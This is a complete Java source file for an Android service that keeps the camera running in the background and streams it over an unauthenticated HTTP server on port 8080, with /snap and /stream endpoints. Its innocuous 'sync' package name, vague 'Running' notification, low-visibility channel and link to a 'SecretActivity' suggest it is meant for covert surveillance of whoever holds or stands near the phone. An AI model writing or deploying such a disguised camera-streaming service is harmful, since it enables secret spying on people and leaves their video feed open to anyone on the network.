package com.sync.svc;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.graphics.SurfaceTexture;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Collections;
import java.util.List;

public class CamService extends Service {
    public static final int PORT = 8080;
    private static final String CH = "cam";
    private static volatile CamService inst;

    public static boolean isRunning() { return inst != null; }
    public static void setTorch(boolean on) { CamService s = inst; if (s != null) s.applyTorch(on); }
    public static void flip() { CamService s = inst; if (s != null) s.nextCam(); }

    public static String url() { return "http://" + ip() + ":" + PORT + "/"; }

    private static String ip() {
        try {
            List<NetworkInterface> all = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface n : all) {
                for (InetAddress a : Collections.list(n.getInetAddresses())) {
                    if (!a.isLoopbackAddress() && a instanceof Inet4Address) return a.getHostAddress();
                }
            }
        } catch (Exception e) { }
        return "0.0.0.0";
    }

    private Camera cam;
    private int camId = 0;
    private boolean torch = false;
    private volatile boolean alive = true;
    private volatile byte[] frame;
    private final Object lock = new Object();
    private long last = 0;
    private ServerSocket server;
    private PowerManager.WakeLock wl;

    @Override public void onCreate() {
        super.onCreate();
        inst = this;
        foreground();
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "sync:cam");
        wl.acquire();
        openCam();
        startServer();
    }

    @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onDestroy() {
        alive = false;
        releaseCam();
        try { if (server != null) server.close(); } catch (Exception e) { }
        try { if (wl != null) wl.release(); } catch (Exception e) { }
        inst = null;
        super.onDestroy();
    }

    private void foreground() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel c = new NotificationChannel(CH, "Service", NotificationManager.IMPORTANCE_LOW);
            c.setShowBadge(false);
            nm.createNotificationChannel(c);
        }
        PendingIntent pi = PendingIntent.getActivity(this, 0,
                new Intent(this, SecretActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
                PendingIntent.FLAG_IMMUTABLE);
        Notification n = new Notification.Builder(this, CH)
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setContentTitle("Running")
                .setContentText(url())
                .setOngoing(true)
                .setContentIntent(pi)
                .build();
        if (Build.VERSION.SDK_INT >= 29) startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        else startForeground(1, n);
    }

    private void openCam() {
        releaseCam();
        try { cam = Camera.open(camId); }
        catch (Exception e) {
            camId = camId == 0 ? 1 : 0;
            try { cam = Camera.open(camId); } catch (Exception e2) { return; }
        }
        Camera.Parameters p = cam.getParameters();
        Camera.Size best = null;
        for (Camera.Size s : p.getSupportedPreviewSizes()) {
            if (s.width > 1280) continue;
            if (best == null || s.width * s.height > best.width * best.height) best = s;
        }
        if (best == null) best = p.getSupportedPreviewSizes().get(0);
        p.setPreviewSize(best.width, best.height);
        p.setPictureSize(best.width, best.height);
        List<String> modes = p.getSupportedFlashModes();
        if (modes != null && modes.contains(Camera.Parameters.FLASH_MODE_TORCH))
            p.setFlashMode(torch ? Camera.Parameters.FLASH_MODE_TORCH : Camera.Parameters.FLASH_MODE_OFF);
        cam.setParameters(p);
        try { cam.setPreviewTexture(new SurfaceTexture(10)); } catch (Exception e) { }

        final int w = best.width, h = best.height;
        final byte[] buf = new byte[w * h * 3 / 2];
        cam.addCallbackBuffer(buf);
        cam.setPreviewCallbackWithBuffer((data, c) -> {
            c.addCallbackBuffer(buf);
            long now = System.currentTimeMillis();
            if (now - last < 110) return;
            last = now;
            try {
                YuvImage y = new YuvImage(data, ImageFormat.NV21, w, h, null);
                ByteArrayOutputStream bo = new ByteArrayOutputStream();
                y.compressToJpeg(new Rect(0, 0, w, h), 68, bo);
                byte[] f = bo.toByteArray();
                synchronized (lock) { frame = f; lock.notifyAll(); }
            } catch (Exception e) { }
        });
        cam.startPreview();
    }

    private void releaseCam() {
        if (cam == null) return;
        try { cam.setPreviewCallbackWithBuffer(null); } catch (Exception e) { }
        try { cam.stopPreview(); } catch (Exception e) { }
        try { cam.release(); } catch (Exception e) { }
        cam = null;
    }

    private void applyTorch(boolean on) {
        torch = on;
        if (cam == null) return;
        try {
            Camera.Parameters p = cam.getParameters();
            p.setFlashMode(on ? Camera.Parameters.FLASH_MODE_TORCH : Camera.Parameters.FLASH_MODE_OFF);
            cam.setParameters(p);
        } catch (Exception e) { }
    }

    private void nextCam() {
        camId = camId == 0 ? 1 : 0;
        openCam();
    }

    private void startServer() {
        new Thread(() -> {
            try {
                server = new ServerSocket(PORT);
                while (alive) {
                    Socket s = server.accept();
                    new Thread(() -> serve(s)).start();
                }
            } catch (Exception e) { }
        }).start();
    }

    private void serve(Socket s) {
        try {
            s.setSoTimeout(20000);
            BufferedReader r = new BufferedReader(new InputStreamReader(s.getInputStream()));
            String line = r.readLine();
            String path = "/";
            if (line != null && line.split(" ").length > 1) path = line.split(" ")[1];
            OutputStream out = s.getOutputStream();
            if (path.startsWith("/snap")) {
                out.write("HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\nConnection: close\r\n\r\n".getBytes());
                byte[] f; synchronized (lock) { f = frame; }
                if (f != null) out.write(f);
                out.flush();
                return;
            }
            if (path.startsWith("/stream")) {
                out.write("HTTP/1.1 200 OK\r\nContent-Type: multipart/x-mixed-replace; boundary=f\r\nConnection: close\r\n\r\n".getBytes());
                while (alive) {
                    byte[] f;
                    synchronized (lock) { if (frame == null) lock.wait(1000); f = frame; }
                    if (f == null) continue;
                    out.write(("--f\r\nContent-Type: image/jpeg\r\nContent-Length: " + f.length + "\r\n\r\n").getBytes());
                    out.write(f);
                    out.write("\r\n".getBytes());
                    out.flush();
                    Thread.sleep(130);
                }
                return;
            }
            String html = "<meta name=viewport content='width=device-width'>"
                    + "<style>body{margin:0;background:#000}img{width:100%;height:100vh;object-fit:contain}</style>"
                    + "<img src=/stream>";
            out.write(("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n" + html).getBytes());
            out.flush();
        } catch (Exception e) { }
        finally { try { s.close(); } catch (Exception e) { } }
    }
}
